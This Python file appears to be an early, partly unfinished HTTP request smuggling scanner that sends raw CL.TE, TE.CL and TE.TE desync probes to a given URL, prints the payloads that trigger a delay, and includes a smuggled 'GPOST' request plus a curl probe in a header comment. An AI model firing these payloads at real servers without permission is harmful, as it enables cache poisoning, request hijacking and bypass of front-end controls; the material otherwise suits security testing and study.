# https://stackoverflow.com/questions/20658572/python-requests-print-entire-http-request-raw
'''

curl -L -X POST -H "Content-Length: 5" -H "Transfer-Encoding: chunked" --data "0\r\n\r\n" http://v.lactea.kr

'''

import requests
import argparse
from fake_useragent import UserAgent
import time
import socket, ssl
from urllib.parse import urlparse


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class checkServer:
    agent = ''
    timeout = 7
    
    def __init__(self, args):
        self.agent = args.agent
        timeout = args.timeout
    
    def start(self, url, req):
        if self.checkCLTE(url, req) == 0:
            self.clear(url)
            if self.checkTECL(url, req) == 0:
                self.clear(url)
                if self.checkTETE(url, req) == 0:
                    print(f"{bcolors.FAIL}[!] Can't know about server..{bcolors.ENDC}")
    
    def clear(self, url):
        requests.get(url, headers={"User-Agent" : self.agent})
    
    # Check server is CL.CL
    def checkCLCL(self):
        header_payload = {
            "Content-Length": ""
        }
    
    # Check server is CL.TE
    # Timing tech
    def checkCLTE(self, url, req):
        print("[*] Testing CL.TE...")
        
        header = 'POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n'.format(urlparse(url).netloc)
        data = '0\r\n\r\n\r\n'
        
        start = time.time()
        sendPayload(url, header, data)
        
        if time.time() - start >= self.timeout:
            print(f'{bcolors.WARNING}[*] Server using CL.TE{bcolors.ENDC}')
            print(f"{bcolors.FAIL}=== payload ===")
            print(header + data, end="")
            print(f"==============={bcolors.ENDC}")
            return 1
        return 0
        
    # Check server is TE.CL
    # Timing tech
    def checkTECL(self, url, req):
        print("[*] Testing TE.CL...")
        
        header = 'POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n'.format(urlparse(url).netloc)
        data = '0\r\n\r\n\r\n'
        
        start = time.time()
        sendPayload(url, header, data)
        
        if time.time() - start >= self.timeout:
            print(f'{bcolors.WARNING}[*] Server using TE.CL{bcolors.ENDC}')
            print(f"{bcolors.FAIL}=== payload ===")
            print(header + data, end="")
            print(f"==============={bcolors.ENDC}")
            return 1
        return 0
        
    # Check server is TE.TE    
    def checkTETE(self, url, req):
        print("[*] Testing TE.TE...")
        
        header = 'POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: xchunked\r\n\r\n'.format(urlparse(url).netloc)
        data = '5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n'
        
        start = time.time()
        sendPayload(url, header, data)
        
        normal_header = 'POST / HTTP/1.1\r\nHost: {}'.format(urlparse(url).netloc)
        res = sendPayload(url, header, '')
        
        print(res)
        return 1

def banner():
	print("""
                                         _                             
         ___ _ __ ___  _   _  __ _  __ _| | ___ _ __       _ __  _   _ 
        / __| '_ ` _ \| | | |/ _` |/ _` | |/ _ \ '__|     | '_ \| | | |
        \__ \ | | | | | |_| | (_| | (_| | |  __/ |     _  | |_) | |_| |
        |___/_| |_| |_|\__,_|\__, |\__, |_|\___|_|    (_) | .__/ \__, |
                             |___/ |___/                  |_|    |___/ 
                        by universe 
""")
	pass



# Reference
# https://stackoverflow.com/questions/28670835/python-socket-client-post-parameters
# https://stackoverflow.com/questions/32062925/python-socket-server-handle-https-request
def sendPayload(url, header, data):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    parse = urlparse(url)
    
    if parse.scheme == "https":
        port = 443
        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
        s = context.wrap_socket(s, server_hostname=parse.netloc)
    else:
        port = 80
    
    s.connect((parse.netloc, port))
    s.sendall(header.encode('iso-8859-1') + data.encode('ascii'))
    return s.recv(4096)
    

# Generate fake user-agent
def generateUserAgent():
    print("[*] Generating fake user-agent...")
    useragent = UserAgent().chrome
    print("[*] Done.")
    return useragent

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description = "HTTP request Smuggler tools")
    
    parser.add_argument("--url", required=True, help="Input url. --url http://test.com")
    parser.add_argument("--agent", required=False, action="store_true", help="Generating random User-Agent. --agent")
    parser.add_argument("--timeout", required=False, default=7, type=int, help="Set timeout. Default: 7s. --timeout [time]")

    args = parser.parse_args()
    
    banner()
    
    if args.url == "" or args.url == None:
        print("[!] Input URL.")
        exit()
        
    if args.agent == True:
        args.agent = generateUserAgent()
    else:
        args.agent = "Smuggler test"
        
    r = requests.get(args.url)
    tester = checkServer(args)
    
    print("[*] Sending to {}".format(args.url))
    
    tester.start(args.url, r)